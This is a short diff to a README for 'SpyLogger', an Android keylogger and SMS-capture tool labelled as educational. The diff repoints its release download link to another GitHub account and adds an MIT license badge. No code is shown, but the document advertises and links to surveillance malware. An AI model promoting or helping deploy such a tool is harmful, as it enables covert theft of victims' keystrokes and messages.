@@ -17,4 +17,8 @@ Android KeyLogger and SMS Capture (software is meant for educational)
 ## Requisites
 * .NET Framework 4.8
 
-## [Download](https://github.com/A-LedearDev/SpyLogger/releases/tag/Release)
+## [Download](https://github.com/sop898/SpyLogger/releases/tag/SpyLogger)
+
+## License
+
+[![MIT](https://img.shields.io/badge/License-MIT-red)](https://github.com/sop898/SpyLogger/blob/main/LICENSE)
